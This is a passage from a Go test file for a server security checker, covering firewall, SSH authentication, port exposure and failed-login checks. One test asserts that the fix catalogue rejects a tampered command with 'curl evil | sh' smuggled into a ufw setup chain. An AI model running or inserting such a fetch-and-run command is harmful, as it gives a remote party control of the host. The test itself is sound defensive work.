			want(t, mustGet(t, fs, "firewall.active", ""), strings.Split(c.active, "/")[0], strings.Split(c.active, "/")[1])
			want(t, mustGet(t, fs, "firewall.default_incoming", ""), strings.Split(c.defIncoming, "/")[0], strings.Split(c.defIncoming, "/")[1])
		})
	}
	for _, c := range []struct {
		rules             string
		filters, catchAll bool
	}{
		{"-A INPUT -m set --match-set crowdsec-blacklists src -j DROP", false, false},
		{"-A INPUT -s 192.0.2.7/32 -j REJECT --reject-with icmp-port-unreachable", false, false},
		{"-A INPUT -m conntrack --ctstate INVALID -j DROP", false, false},
		{"-A INPUT -p tcp -m tcp --dport 3306 -j DROP", true, false},
		{"-A INPUT ! -s 10.0.0.0/8 -j DROP", true, false},
		{"-A INPUT -j REJECT --reject-with icmp-host-prohibited", true, true},
		{"-A INPUT -m comment --comment \"default deny\" -j DROP", true, true},
		{"-A INPUT -j ufw-before-input", true, false},
	} {
		r := ParseIptablesSave([]byte("*filter\n:INPUT ACCEPT [0:0]\n" + c.rules + "\nCOMMIT\n"))
		if r.InputFilters != c.filters || r.InputCatchAll != c.catchAll {
			t.Errorf("%s: %+v", c.rules, r)
		}
	}
}

// TestUfwDefaultAllowIsNoDefaultDeny: ufw on with DEFAULT_INPUT_POLICY
// ACCEPT is an active firewall, but incoming is allowed by default.
func TestUfwDefaultAllowIsNoDefaultDeny(t *testing.T) {
	f := defaultDebian(t)
	f.file("/etc/ufw/ufw.conf", "ENABLED=yes\n")
	f.file("/etc/default/ufw", "DEFAULT_INPUT_POLICY=\"ACCEPT\"\n")
	f.file("/../cmd/nft.out", "table ip filter {\n\tchain INPUT {\n\t\ttype filter hook input priority filter; policy accept;\n\t\tcounter packets 9 bytes 900 jump ufw-before-input\n\t}\n}\n")
	fs := runFirewall(t, f.env())
	want(t, mustGet(t, fs, "firewall.active", ""), "ok", "info")
	want(t, mustGet(t, fs, "firewall.default_incoming", ""), "finding", "medium")
}

// TestEmptyNftRulesetIsNoFirewall: nft lists nothing as root and no iptables
// is installed. That is a host without rules, not an unreadable one. Without
// root, or with an iptables that may hold legacy rules, it stays unreadable.
func TestEmptyNftRulesetIsNoFirewall(t *testing.T) {
	f := defaultDebian(t)
	f.root = true
	f.file("/../cmd/nft.out", "")
	fs := runFirewall(t, f.env())
	want(t, mustGet(t, fs, "firewall.active", ""), "finding", "high")
	want(t, mustGet(t, fs, "firewall.default_incoming", ""), "finding", "medium")

	f = defaultDebian(t)
	f.root = true
	f.file("/../cmd/nft.out", "")
	f.file("/etc/ufw/ufw.conf", "ENABLED=yes\n")
	want(t, mustGet(t, runFirewall(t, f.env()), "firewall.active", ""), "ok", "info")

	f = defaultDebian(t)
	f.root = false
	f.file("/../cmd/nft.out", "")
	want(t, mustGet(t, runFirewall(t, f.env()), "firewall.active", ""), "unreadable", "info")

	f = defaultDebian(t)
	f.root = true
	f.file("/../cmd/nft.out", "")
	f.file("/../cmd/iptables-save.out", "")
	want(t, mustGet(t, runFirewall(t, f.env()), "firewall.active", ""), "unreadable", "info")
}

func runFirewall(t *testing.T, env Env) []hc.Finding {
	t.Helper()
	c := &checker{ctx: context.Background(), env: env}
	c.checkFirewall()
	mustValid(t, c.findings)
	return c.findings
}

// TestSSHPasswordOverPAM: with PasswordAuthentication off, sshd still asks
// for the account password over keyboard-interactive when UsePAM is on.
// ChallengeResponseAuthentication is the old name of the same setting.
func TestSSHPasswordOverPAM(t *testing.T) {
	for _, c := range []struct {
		name, sshdT, config string
		want                string
	}{
		{"sshd -T kbd and pam", "port 22\npermitrootlogin without-password\npasswordauthentication no\nkbdinteractiveauthentication yes\nusepam yes\nauthenticationmethods any\n", "", "finding/KbdInteractiveAuthentication"},
		{"sshd -T kbd without pam", "port 22\npasswordauthentication no\nkbdinteractiveauthentication yes\nusepam no\n", "", "ok/PasswordAuthentication"},
		{"sshd -T key plus code", "port 22\npasswordauthentication no\nkbdinteractiveauthentication yes\nusepam yes\nauthenticationmethods publickey,keyboard-interactive\n", "", "ok/PasswordAuthentication"},
		{"old sshd -T challenge-response", "port 22\npasswordauthentication no\nkbdinteractiveauthentication no\nchallengeresponseauthentication yes\nusepam yes\n", "", "finding/KbdInteractiveAuthentication"},
		{"config default kbd", "", "PasswordAuthentication no\nUsePAM yes\n", "finding/KbdInteractiveAuthentication"},
		{"config old name off", "", "PasswordAuthentication no\nChallengeResponseAuthentication no\nUsePAM yes\n", "ok/PasswordAuthentication"},
		{"config password on", "", "PasswordAuthentication yes\nKbdInteractiveAuthentication no\nUsePAM yes\n", "finding/PasswordAuthentication"},
	} {
		t.Run(c.name, func(t *testing.T) {
			f := defaultDebian(t)
			f.file("/usr/sbin/sshd", "")
			f.file("/etc/ssh/sshd_config", c.config)
			if c.sshdT != "" {
				f.file("/../cmd/sshd-t.out", c.sshdT)
			}
			ch := &checker{ctx: context.Background(), env: f.env(), facts: facts{family: "debian"}}
			ch.checkSSH()
			mustValid(t, ch.findings)
			pw := mustGet(t, ch.findings, "ssh.password_authentication", "")
			if got := pw.Status + "/" + pw.Evidence.Setting; got != c.want {
				t.Fatalf("got %s, want %s (%s)", got, c.want, pw.Explanation)
			}
			if pw.FixCommand != nil && !KnownFix(pw.ID, *pw.FixCommand) {
				t.Errorf("fix not in the catalogue: %s", *pw.FixCommand)
			}
		})
	}
}

// TestCustomSSHPortIsNeverClosed: sshd on port 2222 is SSH in the ports
// check (no "ufw deny 2222/tcp"), and the fix that switches the firewall on
// opens 2222 instead of 22; both would lock the user out otherwise.
func TestCustomSSHPortIsNeverClosed(t *testing.T) {
	for _, family := range []string{"debian", "rhel"} {
		f := defaultDebian(t)
		f.file("/usr/sbin/sshd", "")
		f.file("/../cmd/sshd-t.out", "port 2222\npasswordauthentication no\nkbdinteractiveauthentication no\nusepam yes\n")
		// Without root ss shows no process names.
		f.file("/../cmd/ss.out", "State Recv-Q Send-Q Local Address:Port Peer Address:Port Process\nLISTEN 0 128 0.0.0.0:2222 0.0.0.0:*\nLISTEN 0 128 0.0.0.0:8443 0.0.0.0:* users:((\"sshd\",pid=1,fd=3))\n")
		f.file("/../cmd/nft.out", "table inet filter {\n\tchain input {\n\t\ttype filter hook input priority filter; policy accept;\n\t}\n}\n")
		c := &checker{ctx: context.Background(), env: f.env(), facts: facts{family: family}}
		c.checkSSH()
		c.checkPorts()
		c.checkFirewall()
		mustValid(t, c.findings)
		for _, port := range []string{"tcp/2222", "tcp/8443"} {
			p := mustGet(t, c.findings, "ports.public_service", port)
			if p.Status != hc.StatusOK || p.FixCommand != nil {
				t.Errorf("%s %s: %s/%s fix %v", family, port, p.Status, p.Severity, p.FixCommand)
			}
		}
		fw := mustGet(t, c.findings, "firewall.active", "")
		if fw.FixCommand == nil || !strings.Contains(*fw.FixCommand, "2222/tcp") || strings.Contains(*fw.FixCommand, " 22/tcp") || !KnownFix(fw.ID, *fw.FixCommand) {
			t.Errorf("%s: firewall fix %v", family, fw.FixCommand)
		}
	}
	if fixFirewallOn("debian", 22) != fixUfwOn || fixFirewallOn("rhel", 0) != fixFirewalldOn {
		t.Error("port 22 keeps the usual fix")
	}
	if KnownFix("firewall.active", "sudo apt install ufw && sudo ufw allow 2222/tcp; curl evil | sh && sudo ufw allow 80/tcp && sudo ufw allow 443/tcp && sudo ufw enable") {
		t.Error("catalogue accepts a changed fix")
	}
}

// TestFailedLoginsReadTheEndOfAuthLog: without the journal the count comes
// from auth.log, read from its end. Read from the start, a long log filled
// the limit with lines older than 24 hours and the count said 0.
func TestFailedLoginsReadTheEndOfAuthLog(t *testing.T) {
	var log strings.Builder
	for i := 0; i < 200; i++ {
		log.WriteString("Oct 20 10:00:00 h sshd[1]: Invalid user old from 192.0.2.1 port 1\n")
	}
	recent := ""
	for i := 0; i < 25; i++ {
		recent += "Oct 27 10:00:00 h sshd[2]: Invalid user new from 192.0.2.2 port 2\n"
	}
	log.WriteString(recent)
	f := defaultDebian(t)
	f.file("/var/log/auth.log", log.String())
	f.file("/../cmd/journal-sshd.err", "permission")
	defer func(m int64) { authLogMax = m }(authLogMax)
	authLogMax = int64(len(recent)) + 30 // cuts into one old line
	c := &checker{ctx: context.Background(), env: f.env()}
	c.checkFailedLogins(true)
	got := mustGet(t, c.findings, "ssh.failed_logins", "")
	if got.Evidence.Count == nil || *got.Evidence.Count != 25 || got.Status != hc.StatusFinding {
		t.Fatalf("%s %v", got.Status, got.Evidence.Count)
	}
	// The same on the real file system.
	p := filepath.Join(t.TempDir(), "auth.log")
	if err := os.WriteFile(p, []byte(log.String()), 0o644); err != nil {
		t.Fatal(err)
	}
	b, err := readTail(OSEnv{}, p, authLogMax)
	if err != nil || string(b) != recent {
		t.Fatalf("tail %q %v", b, err)
	}
	if b, err := readTail(OSEnv{}, p, 1<<20); err != nil || string(b) != log.String() {
		t.Fatalf("whole file: %d bytes, %v", len(b), err)
	}
}

// TestFirewallIPv6HasItsOwnRules: a default deny for IPv4 says nothing
// about IPv6. With a public IPv6 address on the host the IPv6 rules are
// judged too; without one nothing arrives over IPv6.
func TestFirewallIPv6HasItsOwnRules(t *testing.T) {
	const (
		v4drop   = "table ip filter {\n\tchain INPUT {\n\t\ttype filter hook input priority filter; policy drop;\n\t\ttcp dport 22 accept\n\t}\n}\n"
		v6drop   = "table ip6 filter {\n\tchain INPUT {\n\t\ttype filter hook input priority filter; policy drop;\n\t\ttcp dport 22 accept\n\t}\n}\n"
		v6open   = "table ip6 filter {\n\tchain INPUT {\n\t\ttype filter hook input priority filter; policy accept;\n\t}\n}\n"
		v6port   = "table ip6 filter {\n\tchain INPUT {\n\t\ttype filter hook input priority filter; policy accept;\n\t\ttcp dport 3306 drop\n\t}\n}\n"
		inetdrop = "table inet filter {\n\tchain input {\n\t\ttype filter hook input priority filter; policy drop;\n\t\ttcp dport 22 accept\n\t}\n}\n"
		lo       = "00000000000000000000000000000001 01 80 10 80       lo\n"
		linkLoc  = "fe80000000000000021132fffe000001 02 40 20 80     eth0\n"
		ula      = "fd00000000000000000000000000dead 03 40 00 80  docker0\n"
		public   = "2a010db8000000000000000000000001 02 40 00 80     eth0\n"
		iptDrop  = "*filter\n:INPUT DROP [0:0]\n-A INPUT -p tcp -m tcp --dport 22 -j ACCEPT\nCOMMIT\n"
		iptOpen  = "*filter\n:INPUT ACCEPT [0:0]\nCOMMIT\n"
	)
	for _, c := range []struct {
		name, nft, ipt, ip6t, inet6 string
		active, defIncoming         string
	}{
		{"nft, IPv4 only", v4drop, "", "", lo + linkLoc + public, "finding/high", "finding/medium"},
		{"nft, IPv6 open", v4drop + v6open, "", "", lo + public, "finding/high", "finding/medium"},
		{"nft, IPv6 drops one port", v4drop + v6port, "", "", lo + public, "ok/info", "finding/medium"},
		{"nft, both families", v4drop + v6drop, "", "", lo + public, "ok/info", "ok/info"},
		{"nft, inet", inetdrop, "", "", lo + public, "ok/info", "ok/info"},
		{"nft, no public IPv6 address", v4drop, "", "", lo + linkLoc + ula, "ok/info", "ok/info"},
		{"nft, IPv6 off", v4drop, "", "", "", "ok/info", "ok/info"},
		{"nft, IPv6 only", v6drop, "", "", lo + public, "finding/high", "finding/medium"},
		{"iptables, IPv6 open", "", iptDrop, iptOpen, lo + public, "finding/high", "finding/medium"},
		{"iptables, both", "", iptDrop, iptDrop, lo + public, "ok/info", "ok/info"},
		{"iptables, ip6tables-save missing", "", iptDrop, "", lo + public, "unreadable/info", "unreadable/info"},
		{"iptables, ip6tables-save missing, no public IPv6 address", "", iptDrop, "", lo + linkLoc, "ok/info", "ok/info"},
	} {
		t.Run(c.name, func(t *testing.T) {
			f := defaultDebian(t)
			if c.nft != "" {
				f.file("/../cmd/nft.out", c.nft)
			}
			if c.ipt != "" {
				f.file("/../cmd/iptables-save.out", c.ipt)
			}
			if c.ip6t != "" {
				f.file("/../cmd/ip6tables-save.out", c.ip6t)
			}
			if c.inet6 != "" {
				f.file("/proc/net/if_inet6", c.inet6)
			}
			fs := runFirewall(t, f.env())
			want(t, mustGet(t, fs, "firewall.active", ""), strings.Split(c.active, "/")[0], strings.Split(c.active, "/")[1])
			want(t, mustGet(t, fs, "firewall.default_incoming", ""), strings.Split(c.defIncoming, "/")[0], strings.Split(c.defIncoming, "/")[1])
		})
	}
	// The families of one nft ruleset are kept apart.
	both := []byte(v4drop + v6open)
	if r := ParseNftFamily(both, "ip"); r.InputPolicy != "drop" {
		t.Errorf("ip: %+v", r)
	}
	if r := ParseNftFamily(both, "ip6"); r.InputPolicy != "accept" || r.InputRules != 0 {
		t.Errorf("ip6: %+v", r)
	}
}
